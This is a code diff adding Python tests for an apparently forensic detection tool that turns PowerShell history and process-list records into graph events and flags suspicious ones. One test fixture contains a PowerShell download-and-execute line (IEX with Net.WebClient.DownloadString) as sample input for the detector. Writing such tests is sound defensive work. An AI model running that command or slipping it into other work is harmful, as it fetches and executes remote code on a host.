@@ -357,6 +357,46 @@ def test_service_scoring_no_false_positive_but_catches_temp():
     assert any("EvilSvc" in t for t in svc_finds), "temp-dir service must be flagged"
 
 
+def test_psreadline_history_to_events():
+    cd = {"Windows.System.Powershell.PSReadline": [
+        {"Line": "# comment line", "Username": "bob", "OSPath": "h", "_client_id": "C.z", "_hostname": "H"},
+        {"Line": "Get-ChildItem", "Username": "bob", "OSPath": "h", "_client_id": "C.z", "_hostname": "H"},
+        {"Line": "IEX (New-Object Net.WebClient).DownloadString('http://x/y')",
+         "Username": "bob", "OSPath": "h", "_client_id": "C.z", "_hostname": "H"}]}
+    ents, rels = map_agentic(cd, run_id="a", hostnames={"C.z": "H"})
+    evs = [e for e in ents if e.type == "event"]
+    assert len(evs) == 2, "comments skipped, two commands kept"
+    assert any("suspicious_powershell" in e.flags for e in evs), "IEX/DownloadString flagged"
+    assert any(r.kind == "executed" for r in rels), "account executed the command"
+
+
+def test_pslist_unsigned_in_temp_flags_and_hashes():
+    h = "b" * 64
+    cd = {"Windows.System.Pslist": [
+        {"Pid": 10, "Ppid": 4, "Name": "evil.exe", "Exe": "C:\\Users\\v\\AppData\\Local\\Temp\\evil.exe",
+         "CreateTime": "2026-06-15T08:00:00Z", "Hash": {"SHA256": h},
+         "Authenticode": {"Trusted": "untrusted"}, "_client_id": "C.z", "_hostname": "H"}]}
+    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
+    proc = [e for e in g.by_type("process") if "unsigned" in e.flags]
+    assert proc and proc[0].anomaly >= 40, "unsigned temp binary flagged + scored"
+    assert keys.ioc_id("hash", h) in g.entities, "unsigned binary hash -> cross-host IOC"
+
+
+def test_pslist_catalog_signed_store_app_not_flagged():
+    # MS Store / Program Files apps are catalog-signed -> Authenticode 'untrusted'
+    # but benign; must NOT be flagged.
+    cd = {"Windows.System.Pslist": [
+        {"Pid": 11, "Ppid": 4, "Name": "WidgetService.exe", "TokenIsElevated": True,
+         "Exe": "C:\\Program Files\\WindowsApps\\Microsoft.Widgets\\WidgetService.exe",
+         "CreateTime": "2026-06-15T08:00:00Z", "Hash": {"SHA256": "c" * 64},
+         "Authenticode": {"Trusted": "untrusted"}, "_client_id": "C.z", "_hostname": "H"}]}
+    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
+    assert not [e for e in g.by_type("process") if "unsigned" in e.flags], \
+        "catalog-signed Program Files app must not be flagged unsigned"
+    assert not [f for f in g.findings if "WidgetService" in f.title]
+    assert keys.ioc_id("hash", "c" * 64) not in g.entities, "benign hash not flooded into graph"
+
+
 if __name__ == "__main__":
     g = build()
     print(f"=== GRAPH: {len(g.entities)} entities, {len(g.relationships)} rels, "
